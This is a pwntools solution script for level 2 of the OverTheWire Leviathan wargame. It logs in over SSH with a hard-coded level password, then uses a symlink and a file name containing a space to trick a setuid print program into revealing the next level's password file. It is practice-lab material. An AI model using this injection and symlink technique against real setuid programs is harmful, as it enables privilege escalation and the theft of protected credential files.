#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms
from time import sleep

level = 2 
user = 'leviathan%s' % level
host = 'leviathan.labs.overthewire.org'
password = 'ougahZi8Ta'
port = 2223

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

# Base folder for unpack
UNPACK_FOLDER='/tmp/%s' % randoms(10)

sh = connectToLevel()
sh = sh.process('/bin/sh', env={'PS1':''})
sh.sendline('mkdir -p %s' % UNPACK_FOLDER)
sh.sendline('cd %s' % UNPACK_FOLDER)
sh.sendline('ln -s /etc/leviathan_pass/leviathan3 leviathan3')
sh.sendline('touch "tmp leviathan3"')
sh.sendline('/home/leviathan2/printfile "tmp leviathan3" 2>/dev/null')
log.info('Flag = %s' % sh.recvline())